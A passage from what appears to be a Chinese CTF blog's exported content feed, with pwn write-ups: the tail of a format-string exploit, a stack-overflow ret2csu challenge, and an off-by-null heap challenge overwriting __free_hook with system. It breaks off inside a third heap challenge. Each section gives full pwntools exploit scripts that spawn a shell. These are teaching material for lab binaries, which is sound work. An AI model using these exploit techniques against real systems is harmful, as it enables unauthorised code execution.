class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((leak_10 &amp; <span class="number">0xff</span>) + <span class="number">8</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%6$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x16</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%10$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((leak_10 &amp; <span class="number">0xff</span>) + <span class="number">9</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%6$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0xb0</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%10$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((leak_10 &amp; <span class="number">0xff</span>) + <span class="number">10</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%6$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x04</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%10$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((leak_10 &amp; <span class="number">0xff</span>) + <span class="number">11</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%6$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x08</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%10$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((system &amp; <span class="number">0xff</span>)) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%14$hhn&#x27;</span></span><br><span class="line">pay += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(((system&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>)+<span class="number">0x20</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%15$hhn&#x27;</span></span><br><span class="line">pay += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(((system&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)+<span class="number">0x6e</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%16$hhn&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 格式化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>西湖论剑wp</title>
      <link href="/2021/11/21/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/"/>
      <url>/2021/11/21/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/</url>
      
        <content type="html"><![CDATA[<h2 id="blind"><a href="#blind" class="headerlink" title="blind"></a>blind</h2><h3 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h3><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/xihulunjian-wp/1637485388928339/59dc94b41900626acc35fcf6a2b215700d2a0ae0.png"></p><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>没开 canary，简单栈溢出，有时间限制，意思就是只能一次过，所以泄露函数然后 rop 那些都不行了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  alarm(<span class="number">8u</span>);</span><br><span class="line">  sleep(<span class="number">3u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x500</span>uLL);</span><br><span class="line">&#125;</span><br><span class="line">--------------------------------------------------------</span><br><span class="line"><span class="number">-0000000000000050</span></span><br><span class="line"><span class="number">-0000000000000050</span> buf             db <span class="number">80</span> dup(?)</span><br><span class="line">+<span class="number">0000000000000000</span>  s              db <span class="number">8</span> dup(?)</span><br><span class="line">+<span class="number">0000000000000008</span>  r              db <span class="number">8</span> dup(?)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>RELRO 保护为 Partial RELRO，说明可以改 got 表</p><p>发现 alarm 函数有调用 syscall ，于是利用 ret2csu 将 alarm 的 got 改为 syscall，并利用 read 函数把 rax 参数改为 0x3b 调用号</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/xihulunjian-wp/1637485820904212/8a3235baea815b1329e5f99177fd0b0cddcdd9ca.png" alt="image-20211121171020763"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">alarm_got = elf.got[<span class="string">&#x27;alarm&#x27;</span>]</span><br><span class="line">bss = <span class="number">0x601088</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">addr,rdi,rsi,rdx</span>):</span></span><br><span class="line">bx = <span class="number">0</span></span><br><span class="line">bp = <span class="number">1</span></span><br><span class="line">r12 = addr</span><br><span class="line">r13 = rdx</span><br><span class="line">r14 = rsi</span><br><span class="line">r15 = rdi</span><br><span class="line">pay = p64(<span class="number">0x4007BA</span>) + p64(bx) + p64(bp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(<span class="number">0x4007A0</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>*<span class="number">7</span></span><br><span class="line"><span class="keyword">return</span> pay</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x58</span></span><br><span class="line">payload += csu(read_got,<span class="number">0</span>,alarm_got,<span class="number">1</span>)</span><br><span class="line">payload += csu(read_got,<span class="number">0</span>,bss,<span class="number">0x3b</span>)</span><br><span class="line">payload += csu(alarm_got,bss,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">payload += (<span class="number">0x500</span> - <span class="built_in">len</span>(payload))*<span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.send(<span class="string">&#x27;\x15&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span> + <span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x3b</span>-<span class="number">0x8</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 西湖论剑 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>off by null构造堆重叠(unsortedbin的double free)</title>
      <link href="/2021/11/13/off%20by%20null%E6%9E%84%E9%80%A0%E5%A0%86%E9%87%8D%E5%8F%A0(unsortedbin%E7%9A%84double%20free)/"/>
      <url>/2021/11/13/off%20by%20null%E6%9E%84%E9%80%A0%E5%A0%86%E9%87%8D%E5%8F%A0(unsortedbin%E7%9A%84double%20free)/</url>
      
        <content type="html"><![CDATA[<h2 id="深育杯的-writebook"><a href="#深育杯的-writebook" class="headerlink" title="深育杯的 writebook"></a>深育杯的 writebook</h2><h3 id="主要函数"><a href="#主要函数" class="headerlink" title="主要函数"></a>主要函数</h3><h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_ABC</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> size; <span class="comment">// [rsp+Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> size_4; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span> &amp;&amp; chunk_addr[<span class="number">2</span> * i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Buy a new book&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. Write on one side?&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. Write on both sides?&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;size_4);</span><br><span class="line">        <span class="keyword">if</span> ( size_4 == <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( size_4 != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">        <span class="keyword">if</span> ( size &gt; <span class="number">0x10F</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( size &lt;= <span class="number">0x1E0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v1 = <span class="number">2</span> * i;</span><br><span class="line">            chunk_addr[v1] = <span class="built_in">malloc</span>(size);</span><br><span class="line">            <span class="keyword">if</span> ( !chunk_addr[<span class="number">2</span> * i] )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">LABEL_11:</span><br><span class="line">            chunk_addr[<span class="number">2</span> * i + <span class="number">1</span>] = size;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;page #%d\n&quot;</span>, i);</span><br><span class="line">            <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;can you not write that much?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;don&#x27;t waste pages -.-&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><p>off by null</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_E1D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Page: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">19</span> &amp;&amp; chunk_addr[<span class="number">2</span> * v1] )</span><br><span class="line">    sub_D6C(chunk_addr[<span class="number">2</span> * v1], (<span class="keyword">unsigned</span> <span class="keyword">int</span>)chunk_addr[<span class="number">2</span> * v1 + <span class="number">1</span>]);<span class="comment">//off by null</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Page: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">19</span> &amp;&amp; chunk_addr[<span class="number">2</span> * v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)chunk_addr[<span class="number">2</span> * v1]);</span><br><span class="line">    chunk_addr[<span class="number">2</span> * v1] = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="show"><a href="#show" class="headerlink" title="show"></a>show</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Page: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">19</span> &amp;&amp; chunk_addr[<span class="number">2</span> * v1] )</span><br><span class="line">    <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)chunk_addr[<span class="number">2</span> * v1]);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./main&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;192.168.38.158&#x27;</span>,<span class="string">&#x27;2002&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add1</span>(<span class="params">size</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span>(<span class="params">size</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">page,con</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(page))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">page</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(page))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">page</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(page))</span><br><span class="line"></span><br><span class="line">add1(<span class="number">0xf0</span>)<span class="comment">#0</span></span><br><span class="line">add1(<span class="number">0xf0</span>)<span class="comment">#1</span></span><br><span class="line">add1(<span class="number">0xf0</span>)<span class="comment">#2</span></span><br><span class="line">add1(<span class="number">0xf0</span>)<span class="comment">#3</span></span><br><span class="line">add1(<span class="number">0xf0</span>)<span class="comment">#4</span></span><br><span class="line">add1(<span class="number">0xf0</span>)<span class="comment">#5</span></span><br><span class="line">add1(<span class="number">0xf0</span>)<span class="comment">#6</span></span><br><span class="line">add1(<span class="number">0xf0</span>)<span class="comment">#7 d</span></span><br><span class="line">add1(<span class="number">0x38</span>)<span class="comment">#8</span></span><br><span class="line">add1(<span class="number">0xf0</span>)<span class="comment">#9</span></span><br><span class="line">add1(<span class="number">0xf0</span>)<span class="comment">#10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">dele(i)</span><br><span class="line">add1(<span class="number">0</span>)<span class="comment">#0   进入unsortedbin泄露地址</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libcbase = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))+<span class="number">0x7f797bec98e8</span>-<span class="number">0x7f797c2b5678</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0xe0</span>+<span class="number">0x40</span>))</span><br><span class="line">dele(<span class="number">9</span>)</span><br><span class="line">add1(<span class="number">0xd8</span>)<span class="comment">#1</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add1(<span class="number">0x38</span>)<span class="comment">#2</span></span><br><span class="line">add1(<span class="number">0x30</span>)<span class="comment">#3</span></span><br><span class="line">dele(<span class="number">3</span>)<span class="comment">#为了让0x40大小的tcabin多一个chunk以申请出free_hook</span></span><br><span class="line">dele(<span class="number">8</span>)<span class="comment">#2与8重叠</span></span><br><span class="line">edit(<span class="number">2</span>,p64(libcbase+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))<span class="comment">#将free_hook写入tcabin</span></span><br><span class="line">print(<span class="string">&quot;libc:&quot;</span>+<span class="built_in">hex</span>(libcbase+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">add1(<span class="number">0x38</span>)<span class="comment">#3</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add1(<span class="number">0x38</span>)<span class="comment">#4</span></span><br><span class="line">edit(<span class="number">4</span>,p64(libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]))<span class="comment">#将free_hook改为system</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">chunk 0x000000000202060</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="sctf-2019-easy-heap"><a href="#sctf-2019-easy-heap" class="headerlink" title="sctf_2019_easy_heap"></a>sctf_2019_easy_heap</h2><h3 id="主要函数-1"><a href="#主要函数-1" class="headerlink" title="主要函数"></a>主要函数</h3><h4 id="sub-CD0"><a href="#sub-CD0" class="headerlink" title="sub_CD0"></a>sub_CD0</h4><p>main 最开始给的函数</p><p>mmap 了一段很大的内存，并给出了它的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td 